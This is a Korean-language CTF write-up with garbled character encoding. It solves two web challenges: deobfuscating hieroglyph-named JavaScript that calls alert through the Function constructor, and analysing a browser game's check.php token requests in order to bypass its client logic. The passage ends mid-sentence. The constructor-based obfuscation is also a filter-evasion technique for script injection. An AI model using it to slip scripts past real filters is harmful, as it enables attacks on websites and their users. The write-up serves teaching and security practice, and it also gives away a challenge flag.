</p><figure id="ef2dfe41-30a0-4967-a8e2-3c9ea882447a" class="image"><a href="/assets/2020-09-01/bob/bob913.png"><img style="width:782px" src="/assets/2020-09-01/bob/bob913.png"/></a></figure><p id="838e4d96-d75e-49b8-b9b0-fd08f8363b4e" class="">
</p><p id="c8cc09b4-acf1-41bd-bda9-831504b47340" class="">
</p><h2 id="88cc70cc-816c-4db4-91db-cfa0f1d61fde" class="">King musae</h2><hr id="49de7dcb-b368-489e-b1f2-a7d7f1913684"/><figure id="967fdf64-33cc-4be3-a447-3abddc3ff9cd" class="image"><a href="/assets/2020-09-01/bob/bob914.png"><img style="width:717px" src="/assets/2020-09-01/bob/bob914.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="11c0c9f3-ff2e-465e-9be1-a31603a7800b"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">[Javasciprt ë‚œë…í™”]
í•´ë‹¹ ë¬¸ì œëŠ” Javascript ë‚œë…í™”ì´ë©°, ê°„ë‹¨í•˜ê²Œ í”Œë˜ê·¸ê°€ ìˆ¨ê²¨ì ¸ ìˆëŠ” ë¬¸ì œì„
(ë³¸ ë¬¸ì œëŠ” <a href="https://m.blog.naver.com/chiot_aile/221592247073">ë¡œì–„ ë§ˆì¹´ë¡± ì•µë¬´ìƒˆ</a>ê°€ ìƒê°ë‚˜ì„œ ë§Œë“¤ê²Œ ë˜ì—ˆìœ¼ë©°,  ë¼ì˜¨ì— ë†€ëŸ¬ì˜¤ì‹œë©´ ê¼­ ì—¬ê¸° ë§ˆì¹´ë¡±ì§‘ ê°€ì•¼ë©ë‹ˆë‹¤.)

í’€ì´ëŠ” ì–´ë µì§€ ì•Šìœ¼ë©°, ê°„ë‹¨í•˜ë‹¤. ë³„ë‹¤ë¥¸ ì•ˆí‹° ë””ë²„ê¹… ë° ë³µì¡í•œ ë‚œë…í™”ê°€ ì•„ë‹Œ ë‹¨ìˆœíˆ í”Œë˜ê·¸ê°€ ì¶œë ¥ë˜ì§€ ëª»í•˜ë„ë¡ ë³€ìˆ˜ì— ì €ì¥ë˜ì–´ìˆëŠ” ê±¸ ì°¾ëŠ” ë¬¸ì œì„</div></figure><p id="003f9d31-be58-4d14-9801-3214e198ef78" class="">
</p><h3 id="0666b32d-9c63-4b26-8030-a3bdebd7ea14" class="">1. ë¬¸ì œ íŒŒì•…í•˜ê¸°</h3><ul id="ed588fe6-cad0-47e8-8ebc-ac7abcee3918" class="bulleted-list"><li>ë¬¸ì œ ì‚¬ì´íŠ¸ì— ì ‘ì†í•˜ë©´ Javascript Alertë¡œ &quot;<strong>find Flag</strong>&quot;ë¥¼ ì¶œë ¥ëœë‹¤.</li></ul><figure id="6a753f0a-917d-4ebc-b2ba-21ee53941e78" class="image"><a href="/assets/2020-09-01/bob/bob915.png"><img style="width:449px" src="/assets/2020-09-01/bob/bob915.png"/></a></figure><p id="f127b2b3-548f-4d35-9683-dca5494ad265" class="">
</p><ul id="9158e8a6-e287-4389-9b19-c5f849588a35" class="bulleted-list"><li>Chrome ê°œë°œì ë„êµ¬ì¸ ì†ŒìŠ¤ì½”ë“œ ë³´ê¸°ë¥¼ ëˆŒëŸ¬ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œë¥¼ í™•ì¸í•´ë³´ë©´ ì•„ë˜ì™€ ê°™ì´ ë‚œë…í™”ëœ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><p id="748301c7-3edf-4d55-80fd-37afb660e276" class="">
</p><pre id="b48fb4e7-cc3e-460d-8df9-cfcb6a742373" class="code"><code>ğ“†“ = &quot;{}&quot;,ğ“…§=&#x27;&#x27;,ğ“ƒŸ=&#x27;@&#x27;,ğ“…€=&quot;test&quot;,ğ“…‚=&#x27;&#x27;,ğ“Š=ğ“…‚+{},ğ“†‚ = &#x27;&#x27;,ğ“‡=ğ“…‚,ğ“…¿ = ğ“…‚+ğ“…‚[[]],ğ“†Ÿ=ğ“…‚,++ğ“‡,ğ“†Ÿ=ğ“Š[++ğ“‡],++ğ“†‚,++ğ“†‚,++ğ“†‚,ğ“†Ÿ+=ğ“Š[--ğ“‡],++ğ“†‚,ğ“†Ÿ+=ğ“Š[++ğ“‡],ğ“†Ÿ+=ğ“†“[ğ“…§++],ğ“„§=ğ“Š,--ğ“‡,--ğ“‡,ğ“†²=ğ“…¿[ğ“†‚++], ğ“†²+=ğ“…¿[ğ“†‚++],ğ“†²+=ğ“…¿[ğ“†‚++],++ğ“†‚,ğ“†²+=ğ“…¿[ğ“†‚++],ğ“‚€=!ğ“…‚+ğ“…‚,ğ“„=!ğ“‚€+ğ“…‚,++ğ“‡,ğ“…§,ğ“†£=ğ“‚€[ğ“…‚++],ğ“Š=ğ“‚€[ğ“‡=ğ“…‚],ğ“†‚--,--ğ“†‚,ğ“†Œ=ğ“Š+ğ“ƒŸ+ğ“Š[ğ“‡]+ğ“…¿[--ğ“†‚],ğ“¢=++ğ“‡+ğ“…‚,ğ“†—=ğ“Š[ğ“‡+ğ“¢],ğ“†Œ+=ğ“†“[ğ“…§],ğ“†“[ğ“†¡=ğ“†Ÿ+ğ“„§+ğ“†Œ],ğ“‚€[ğ“†—+=ğ“Š[ğ“…‚]+(ğ“‚€.ğ“„+ğ“Š)[ğ“…‚]+ğ“„[ğ“¢]+ğ“†£+ğ“Š+ğ“‚€[ğ“‡]+ğ“†—+ğ“†£+ğ“Š[ğ“…‚]+ğ“Š][ğ“†—](ğ“„[ğ“…‚]+ğ“„[ğ“‡]+ğ“‚€[ğ“¢]+ğ“Š+ğ“†£+&quot;(&#x27;&quot;+ğ“†²+&quot; Flag&#x27;)&quot;)``</code></pre><ul id="d1f92062-b5dc-4725-a684-643403da57a1" class="bulleted-list"><li>ìš°ì„  ë‚œë…í™”ëœ ìë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ íŒŒì•…í•˜ê¸° ì „ &quot;alert&quot; ë¬¸ìì—´ ì—†ì´ alertê°€ ì‹¤í–‰ëœ ê±´ ì•Œ ìˆ˜ ìˆìœ¼ë©°,  í•´ë‹¹ ì½”ë“œê°€ ì–´ë–»ê²Œ ì‹¤í–‰ë˜ì—ˆëŠ”ì§€ &quot;<strong>`</strong>&quot; ë²¡í„°ë¥¼ ì œê±°í•˜ì—¬ ë‚œë…í™”ëœ ìë°”ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ì§€ ì•Šë„ë¡ chrome consoleì— ë„£ì–´ë³´ë©´ ì•„ë˜ì™€ ê°™ì´ ì½”ë“œê°€ êµ¬í˜„ë˜ì–´ ìˆëŠ” ê±¸ ì•Œ ìˆ˜ ìˆë‹¤.</li></ul><p id="8c5b482e-ef2c-4696-bea9-9f75f256bfdb" class="">
</p><figure id="750e5892-aafe-4615-a502-ccdf2d15a0f0" class="image"><a href="/assets/2020-09-01/bob/bob916.png"><img style="width:1340px" src="/assets/2020-09-01/bob/bob916.png"/></a></figure><ul id="7d82554f-41ec-4949-927b-bf4e11d9f474" class="bulleted-list"><li>í•˜ì§€ë§Œ ë³€ìˆ˜ì— ì €ì¥ëœ FlagëŠ” ì•Œ ìˆ˜ ì—†ì—ˆì§€ë§Œ ë‚œë…í™”ëœ ì½”ë“œë¥¼ í†µí•˜ì—¬ alertê°€ ì‹¤í–‰ëœê±´ ì•Œ ìˆ˜ ìˆë‹¤.</li></ul><p id="5ad38e5b-23ac-4118-ac49-1aa7a4b9e589" class="">
</p><p id="9a353204-95b1-4742-bb82-1912939fc00a" class="">ë³´ë‹¤ ì‰¬ìš´ ì˜ˆì œëŠ” &quot;<a href="https://twitter.com/aemkei/status/1262872762621837314">Martin Kleppe</a>&quot;ê°€ ì‘ì„±í•œ ì½”ë“œë¥¼ ë³´ë©´ ë” ì‰½ê²Œ ì•Œ ìˆ˜ ìˆë‹¤.</p><p id="b81072ad-1855-4806-88cc-c679498fde93" class="">
</p><pre id="d3597522-83fa-40a7-b47d-723efec36132" class="code"><code>const ğ“€€ = &#x27;ğ“…‚&#x27;;
function ğ“†£(ğ“‚€){ alert(ğ“‚€); }
ğ“†£(ğ“€€);</code></pre><p id="df114883-6dff-40fc-ba6e-5d6c7239970b" class="">[Martin Kleppeì˜ special characters]</p><p id="5a4920ae-8944-4fd8-a786-ddd6728c56ee" class="">ìœ„ ì½”ë“œë¥¼ ë¸Œë¼ìš°ì €ì—ì„œ ì‹¤í–‰ë˜ë©´ ìƒˆê°€ ì¶œë ¥ë˜ëŠ”ê±¸ ë³¼ ìˆ˜ ìˆìœ¼ë©°, ìœ„ ì½”ë“œë¥¼ í•˜ë‚˜ì”© ì„¤ëª…í•˜ë©´</p><p id="0813ce48-7d08-4b2b-be8c-48ec941d8538" class="">
</p><p id="0a82dd03-834c-4ad3-9217-70d2f8f924d7" class="">ë¨¼ì € &quot;<strong>ğ“€€</strong>&quot; ë³€ìˆ˜ì— ì‹±ê¸€ ì¿¼í„°ë¡œ ë¬¸ìì—´ë¡œ ë§Œë“¤ì–´ &#x27;<strong>ğ“…‚</strong>&#x27; ìƒˆë¥¼ ì €ì¥í•œë‹¤.</p><p id="78328bd9-d4e9-47a0-a37a-b382e491f035" class="">ê·¸ë¦¬ê³  ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ë¥¼ ë§Œë“œëŠ” ê³¼ì •ì—ì„œ í•¨ìˆ˜ ì´ë¦„ ëŒ€ì‹  &quot;ğ“†£&quot; ì¥ìˆ˜ í’ëŒ•ì´ë¡œ ì„ ì–¸í•˜ê³  ì¸ìëª… ëŒ€ì‹  &quot;ğ“‚€&quot; ë‚˜ë­‡ìì„ ì„ ì–¸í•˜ê³  ë‚´ë¶€ ë¡œì§ì€ alertë¥¼ í†µí•˜ì—¬ ì „ë‹¬ëœ ì¸ì(ë‚˜ë­‡ì)ë¥¼ í†µí•˜ì—¬ ì¶œë ¥ë˜ëŠ” ë¡œì§ì´ë‹¤.</p><p id="1f95f016-4674-43f5-bda8-a4c1ba6cdba0" class="">
</p><p id="0d9824a7-c47a-4f39-a1e1-5395a3c1d7df" class="">ê·¸ëŸ¬ë¯€ë¡œ ìµœì¢…ì ìœ¼ë¡œ ì¥ìˆ˜ í’ëŒ•ì´(í•¨ìˆ˜)ë¥¼ ìƒˆê°€ ì €ì¥ëœ &quot;<strong>ğ“€€&quot;</strong>ë³€ìˆ˜ë¥¼ ì¸ìë¡œ ì „ë‹¬í•˜ì—¬ ê²°êµ­ì—” ìƒˆê°€ ì¶œë ¥ë˜ëŠ” ë¡œì§ì´ë‹¤.<strong> </strong>ì—¬ê¸°ê¹Œì§€ ì´í•´ê°€ ë˜ì—ˆë‹¤ë©´ ì•„ë˜ ì˜ˆì œì—ì„œ ë‚œë…í™”ì— ëŒ€í•´ ì¢€ë” ì•Œì•„ë³´ë„ë¡ í•˜ì.</p><p id="69c41407-ec5c-4a2c-b95e-570b0a2d6f3f" class="">
</p><p id="79b06cdf-fe30-4b8f-a9c5-e6ad6991ec5c" class="">
</p><h3 id="27013a0d-2a3f-479f-84a0-19e75215e5b5" class="">2. ë¡œì§ íŒŒì•…í•˜ê¸°</h3><pre id="fb6abe0a-2b56-46e4-8f8f-a054203526d1" class="code"><code>ğ“…‚=&#x27;&#x27;             //    &quot;&quot;
ğ“‚€=!ğ“…‚+ğ“…‚        //    &quot;true&quot;
ğ“„=!ğ“‚€+ğ“…‚         //    &quot;false&quot;
ğ“Š=ğ“…‚+{}          //    &quot;[object Object]&quot;

ğ“†£=ğ“‚€[ğ“…‚++]        //   &quot;r&quot; (ğ“…‚ = 2)
ğ“Š=ğ“‚€[ğ“‡=ğ“…‚]       //   &quot;u&quot; (ğ“‡  = 2)
ğ“¢=++ğ“‡+ğ“…‚          //    5  (ğ“‡ = 3), (ğ“‡3 + ğ“…‚2)
ğ“†—=ğ“Š[ğ“‡+ğ“¢]         //    &quot;O&quot;


ğ“‚€                 //   &quot;true&quot;
ğ“†—+=ğ“Š[ğ“…‚]         //   &quot;co&quot;
(ğ“‚€.ğ“„+ğ“Š)[ğ“…‚]    //    &quot;n&quot;
ğ“„[ğ“¢]              //   &quot;s&quot;
ğ“†£                 //   &quot;t&quot;
ğ“Š                 //   &quot;r&quot;
ğ“Š[ğ“…‚]            //   &quot;o&quot;
ğ“Š                //    &quot;r&quot;
ğ“†—                 //   &quot;constructor&quot;


ğ“‚€[ğ“†—+=ğ“Š[ğ“…‚]+(ğ“‚€.ğ“„+ğ“Š)[ğ“…‚]+ğ“„[ğ“¢]+ğ“†£+
ğ“Š+ğ“‚€[ğ“‡]+ğ“†—+ğ“†£+ğ“Š[ğ“…‚]+ğ“Š][ğ“†—]
//   Æ’ Function() { [native code] }

ğ“„[ğ“…‚]             //   &quot;a&quot;
ğ“„[ğ“‡]              //   &quot;l&quot;
ğ“‚€[ğ“¢]              //   &quot;e&quot;
ğ“Š                 //   &quot;r&quot;
ğ“†£                  //   &quot;t&quot;

ğ“„[ğ“…‚]+ğ“„[ğ“‡]+ğ“‚€[ğ“¢]+ğ“Š+ğ“†£ // &quot;alert&quot;


ğ“‚€[ğ“†—+=ğ“Š[ğ“…‚]+(ğ“‚€.ğ“„+ğ“Š)[ğ“…‚]+ğ“„[ğ“¢]+ğ“†£+
ğ“Š+ğ“‚€[ğ“‡]+ğ“†—+ğ“†£+ğ“Š[ğ“…‚]+ğ“Š][ğ“†—](ğ“„[ğ“…‚]+ğ“„[ğ“‡]+ğ“‚€[ğ“¢]+ğ“Š+ğ“†£+&quot;(&#x27;&quot;+ğ“†²+&quot; Flag&#x27;)&quot;)
// Æ’ anonymous(
// ) {
// alert(&#x27;find Flag&#x27;)
// }

ğ“‚€[ğ“†—][ğ“†—]
// Æ’ Function() { [native code] }

ğ“‚€[ğ“†—][ğ“†—](ğ“„[ğ“…‚]+ğ“„[ğ“‡]+ğ“‚€[ğ“¢]+ğ“Š+ğ“†£+&quot;(&#x27;DongDongE&#x27;)&quot;)``
//Æ’ anonymous(
//) {
//alert(&#x27;DongDongE&#x27;)
//}</code></pre><ul id="9d8bf489-98e6-4e26-bbf4-fcad3d98e93f" class="bulleted-list"><li>ìœ„ì™€ ê°™ì´ alertë¥¼ ì¶œë ¥í•˜ê¸° ìœ„í•´ ê°ì¢… ë¬¸ìì—´ ì¡°í•©ìœ¼ë¡œ Functionì„ ë§Œë“¤ê³  ë¬¸ìë¥¼ ì¡°í•© í•œë‹¤.</li></ul><p id="3ce67843-deb8-4885-8ec9-a885331cdc65" class="">ìœ„ ì½”ë“œê°€ ê·¸ë˜ë„ ì–´ë µë‹¤ë©´ ì•„ë˜ ì˜ˆì œì—ì„œ ê°„ë‹¨í•˜ê²Œ í’€ì–´ì„œ ì•Œì•„ë³´ë„ë¡ í•˜ì.</p><p id="e00d001e-48e9-4153-8b85-f5f7e1fed80c" class="">
</p><pre id="cbe43603-7ac5-4d2d-97b5-972be15160c1" class="code"><code>ğ“„[ğ“…‚]             //   &quot;a&quot;       &quot;false&quot; ë¬¸ìì—´ì˜ 2ë²ˆì§¸ &quot;a&quot;
ğ“„[ğ“‡]              //   &quot;l&quot;       &quot;false&quot; ë¬¸ìì—´ì˜ 3ë²ˆì§¸ &quot;ã…£&quot;
ğ“‚€[ğ“¢]              //   &quot;e&quot;       &quot;true&quot;  ë¬¸ìì—´ì˜ 4ë²ˆì§¸ &quot;e&quot;
ğ“Š                 //   &quot;r&quot;       &quot;true&quot;  ë¬¸ìì—´ì˜ 2ë²ˆì§¸ &quot;r&quot;
ğ“†£                  //   &quot;t&quot;       &quot;true&quot;  ë¬¸ìì—´ì˜ 1ë²ˆì§¸ &quot;t&quot;</code></pre><p id="d5f39a13-423d-4423-871f-f4c4a446100e" class="">ìœ„ ì½”ë“œì™€ ê°™ì´ &quot;false&quot;ì™€ &quot;true&quot;ì˜ ë¬¸ìì—´ì„ í•˜ë‚˜ì”© ì¶”ì¶œí•˜ì—¬ ì¡°í•©í•˜ë©´ &quot;alert&quot;ê°€ ë˜ì–´ alertê°€ ë¬¸ìì—´ì—ì„œ functionìœ¼ë¡œ ì‹¤í–‰ë˜ë„ë¡ í•˜ëŠ” ì›ë¦¬ì´ë‹¤.</p><p id="3c1a8e9e-a5d2-4709-8858-094e55b5a7e7" class="">
</p><p id="570ce67c-9516-4731-9d35-ade7a497b2c8" class="">ê·¸ëŸ¬ë©´ ìœ„ í”Œë˜ê·¸ë¥¼ ì–»ê¸° ìœ„í•´ í•˜ë‚˜ì”© ë³€ìˆ˜ë¥¼ ì¶œë ¥í•´ë³´ë©´ í”Œë˜ê·¸ê°€ ì¶œë ¥ëœë‹¤.</p><p id="c53b7f5f-b11f-40cd-bc80-04911eb9c3dc" class="">
</p><pre id="2a2a510c-023e-4750-a67f-3512d96b6e87" class="code"><code>ğ“†¡=ğ“†Ÿ+ğ“„§+ğ“†Œ
&quot;bob{[object Object]r@on}&quot;</code></pre><p id="0029245f-e136-4eca-b4a4-4be0b6b63596" class="">
</p><ul id="67a698e7-603f-463d-a716-b441afa85b5a" class="to-do-list"><li><div class="checkbox checkbox-on"></div> <span class="to-do-children-checked">Flag is bob{[object Object]r@on}</span></li></ul><p id="d1159de1-4d54-4d7d-9e73-90a41c597475" class="">
</p><ul id="46c9d633-d005-42fa-a50d-89907e79ac8f" class="bulleted-list"><li>ê°„í˜¹ í”Œë˜ê·¸ê°’ì´ ìë°”ìŠ¤í¬ë¦½íŠ¸ì˜ <strong>&quot;object Object</strong>&quot;ê°€ ìˆëŠ”ê±¸ ì˜ë¬¸ ë“¤ ìˆ˜ ìˆì§€ë§Œ í•˜ë‚˜ì˜ ë¬¸ìë¥¼ ì¶”ì¶œí›„ ì¡°í•©í•˜ê¸° ìœ„í•´ 3-5ì¤„ ë¼ì¸ì´ ë” ì¶”ê°€ëœë‹¤. ì˜ˆë¥¼ ë“¤ì–´ í”Œë˜ê·¸ë¥¼ &quot;bob[R@onWhiteHat_1235]&quot; ì´ëŸ°ì‹ìœ¼ë¡œ ì¶œë ¥í•œë‹¤ê³  í•˜ë©´ 17ê¸€ì ì´ë¯€ë¡œ 17 * 3 = 51ë¼ì¸ì´ ë” ì¶”ê°€ë˜ë¯€ë¡œ ë‚œë…í™”ì„ í’€ì–´ë‚˜ê°€ëŠ” ê³¼ì •ì—ì„œ ë‚œì´ë„ê°€ ìƒìŠ¹ë˜ê³  ë³µì¡í•˜ë¯€ë¡œ ê°„ë‹¨í•œ í”Œë˜ê·¸ë¥¼ ë„£ì–´ ë‚œì´ë„ë¥¼ ë‚®ì¶”ê²Œ ë¨.</li></ul><p id="f25992cd-e477-4608-bdfd-88b7a7730894" class="">
</p><p id="077cd998-97f7-44b0-9e04-92c72f9aafe7" class="">
</p><h2 id="48ebbbc5-61a9-4180-a3cf-84bb289d683a" class="">Fun Fun Game</h2><hr id="044ebf08-24a5-4a28-9866-698b49d18006"/><figure id="d73e7fb2-9c22-4fbc-a314-57345d8dc6b7" class="image"><a href="/assets/2020-09-01/bob/bob917.png"><img style="width:714px" src="/assets/2020-09-01/bob/bob917.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="ec5491fd-89a5-4049-8394-dd04081237de"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">[Javasciprt ì¡°ì‘]
ë¬¸ì œ ì‚¬ì´íŠ¸ì— ì ‘ì† ì‹œ ì•„ë˜ì™€ ê°™ì€ í˜ì´ì§€ê°€ ì¶œë ¥ë˜ë©° ê²Œì„ì´ ì§„í–‰ë˜ë©° ê²Œì„ í”Œë ˆì´ ë°©ë²•ì€ &quot;<mark class="highlight-red"><strong>BOB</strong></mark>&quot; ë¼ê³  ì“°ì—¬ ìˆëŠ” ìš°ì£¼ê´´ë¬¼ì„ ë‹¤ ì œê±°ë˜ì–´ì•¼ Flagê°€ ë‚˜ì˜¤ëŠ” ë¬¸ì œì„.
(ë³¸ ë¬¸ì œëŠ” <a href="https://www.raoncorp.com/ko/recruit/raonlife">Raon Secure Fun Zone</a>ë¥¼ ëª¨í‹°ë¸Œë¡œ ì œì‘ë¨)

í’€ì´ëŠ” ëŒ€ëµ 2ê°€ì§€ë¡œ ìƒê°í•  ìˆ˜ ìˆë‹¤.
ì²« ë²ˆì§¸ëŠ” ì§ì ‘ ê²Œì„ í”Œë ˆì´ë¥¼ ì§„í–‰ í›„ ì „ë¶€ ì œê±°í•˜ì—¬ Flagë¥¼ ì–»ê±°ë‚˜ (Physical),
ë‘ ë²ˆì§¸ ë°©ë²•ìœ¼ë¡œëŠ” ìë°”ìŠ¤í¬ë¦½íŠ¸ ë¡œì§ì„ ìš°íšŒí•˜ì—¬ ê²Œì„í•µ(ë¬´ì , ìŠ¤í”¼ë“œ)ì„ ì œì‘í•˜ì—¬ ê²Œì„ì„ ì§„í–‰í•˜ê±°ë‚˜ ë˜ëŠ” ê²Œì„ ì§„í–‰í•  í•„ìš” ì—†ì´ Flagë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.</div></figure><p id="50e83883-48a5-461f-99c6-f8a4612c2def" class="">
</p><p id="703e931d-fcd4-4f01-bfa3-146cfaae806f" class="">
</p><figure id="29c5337d-0e81-4e36-b1f0-7e59e2ede0e0" class="image"><a href="/assets/2020-09-01/bob/game_1.gif"><img style="width:1012px" src="/assets/2020-09-01/bob/game_1.gif"/></a></figure><p id="6b7b28fc-481b-4381-98f7-74ad6eba97a0" class="">
</p><p id="e92f8be2-5ceb-465a-8571-433b5b7e6e50" class="">
</p><h3 id="12bfc1fb-74d5-422d-82e2-82ad73e9048b" class=""><strong>1. ë¬¸ì œ ë¡œì§ íŒŒì•…í•˜ê¸°</strong></h3><ul id="a62fb401-1482-4180-a1a1-6b5d5639c457" class="bulleted-list"><li>ë¬¸ì œë¥¼ íŒŒì•…í•˜ê¸° ìœ„í•´ ê²Œì„ í•œíŒì„ ì§„í–‰í•œë‹¤.</li></ul><p id="79c70d10-a4c0-4a8a-8660-c43241b495a3" class="">
</p><figure id="caee6d2f-561c-4213-b2c5-788dd8476b33" class="image"><a href="/assets/2020-09-01/bob/bob918.png"><img style="width:1405px" src="/assets/2020-09-01/bob/bob918.png"/></a></figure><ul id="7cbd8941-7266-41d9-a8f2-2add97a646dc" class="bulleted-list"><li>60 Pointê¹Œì§€ ìŒ“ê³  &quot;<strong>Game Over</strong>&quot;ë˜ì–´ &quot;<strong>Restart</strong>&quot; ë²„íŠ¼ì„ ëˆ„ë¥¸ ìƒíƒœì˜  íŒ¨í‚· History ì´ë‹¤.</li></ul><p id="276006ca-b92c-4c56-a4d7-46b23d6a4358" class="">
</p><ul id="99f1e4a4-50a2-4cf7-94f7-32035748767f" class="bulleted-list"><li>ì•„ë˜ íŒ¨í‚·ì„ í†µí•˜ì—¬ í•œë²ˆ ì‚´í´ë³´ë„ë¡ í•˜ì.</li></ul><p id="3ee57ca4-23e5-44b9-ba34-165485030b91" class="">
</p><pre id="5dd82706-08c1-471d-83db-90881a57055b" class="code"><code>POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 142
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

kills=15&amp;token=start</code></pre><p id="2dcbcf3c-339f-4f7c-92df-a89c105eb352" class="">[25ë¼ì¸ íŒ¨í‚· - Request]</p><p id="7aa03962-bab0-4278-9a2c-f8f5876dd054" class="">
</p><pre id="2e053974-f314-46ed-881e-35f9b18a3e0e" class="code"><code>HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 01:44:43 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 32
Connection: close
Content-Type: text/html; charset=UTF-8

d2e94e4635c240c14e209fab2fa719e7</code></pre><p id="d6955314-e414-42a3-9a34-a2adca0d31e9" class="">[25ë¼ì¸ íŒ¨í‚· - Response]</p><p id="a92f244c-969a-47aa-aad1-a837071fc921" class="">
</p><p id="588f6285-ec79-4f0f-81c3-ff6cb3326679" class="">
</p><pre id="7bfc6a7f-737a-48e2-9423-d7eabb5329de" class="code"><code>POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 169
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

kills=15&amp;token=d2e94e4635c240c14e209fab2fa719e7</code></pre><p id="1355a97c-0ac3-4a26-977e-d651f07d917c" class="">[26ë¼ì¸ íŒ¨í‚· - Request]</p><p id="014a7df4-a42d-4cb9-b17b-4dd1318675d6" class="">
</p><pre id="e06bc969-940a-46ae-b330-e5346988142d" class="code"><code>HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 01:44:45 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 32
Connection: close
Content-Type: text/html; charset=UTF-8

7a115a19ee939868ff2222f8fd765606</code></pre><p id="09b62f81-e1cd-449c-aa59-3eb2cbbdae43" class="">[26ë¼ì¸ íŒ¨í‚· - Rsponse]</p><p id="14434266-48a8-498b-a138-f19b51b3fa03" class="">
</p><ul id="6496de01-3f57-4aa2-8780-8877132d95e0" class="bulleted-list"><li>26 ë¼ì¸ ~ 28 ë¼ì¸ê¹Œì§€ ê³¼ì •ì´ ê°™ìœ¼ë¯€ë¡œ ìƒëµ</li></ul><p id="862930d5-2c9c-4e63-b38e-ddeb4ed6aa6d" class="">
</p><p id="f2072882-ba63-406c-82c8-2f561f15b7ab" class="">
</p><pre id="5d322c63-284e-4381-b6ba-4a8aec5b9f99" class="code"><code>POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 11
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

check=start</code></pre><p id="23bbd6ea-cdf3-4f36-b7b6-449427b78700" class="">[ë§ˆì§€ë§‰ 29ë¼ì¸ - Reqeust]</p><p id="7d02547c-9b5f-4b2b-b3b3-f51d44c7aec6" class="">
</p><pre id="c54ae4d4-840c-4061-b8c2-1e6f85534d49" class="code"><code>HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 01:46:52 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8</code></pre><p id="91910242-e9bc-466f-9dcd-2b315e4ce1e1" class="">[ë§ˆì§€ë§‰ 29ë¼ì¸ - Response]</p><p id="95bda5d0-3b4d-44d2-8b9b-9421618bfa96" class="">
</p><ul id="38046142-ce8d-4125-8192-255844666576" class="bulleted-list"><li>ìœ„ì™€ ê°™ì´ ê·œì¹™ì„±ì„ ì°¾ì•„ë³¸ë‹¤ë©´, ì²˜ìŒ ê²Œì„ í”Œë ˆì´í•˜ì—¬ 15Killì„ í•˜ì˜€ì„ ë•Œ &quot;<strong>kills=15&amp;token=start</strong>&quot; POST ê°’ì— Tokenì„ ìƒëµí•˜ì—¬ ë³´ë‚´ì§€ë§Œ, ì‘ë‹µìœ¼ë¡œ &quot;<strong>d2e94e4635c240c14e209fab2fa719e7</strong>&quot; í† í°ì„ ê°€ì ¸ì˜¤ê²Œ ë©ë‹ˆë‹¤. ë‘ ë²ˆì§¸ 15Kill ë¶€í„° ë°›ì•˜ë˜ í† í°ì„ ë‹¤ì‹œ ì „ì†¡í•˜ëŠ” ê·œì¹™ì„ ì°¾ì„ ìˆ˜ ìˆë‹¤.</li></ul><ul id="96badbd8-e49b-412e-b61d-769e8f467906" class="bulleted-list"><li>ë§ˆì§€ë§‰ìœ¼ë¡œ ê²Œì„ì´ ì¢…ë£Œë˜ì—ˆì„ ë•ŒëŠ” ë³„ë‹¤ë¥¸ íŒ¨í‚·ì„ ì „ì†¡í•˜ì§€ ì•Šì§€ë§Œ ì¬ì‹œì‘(Restart) ë²„íŠ¼ì„ 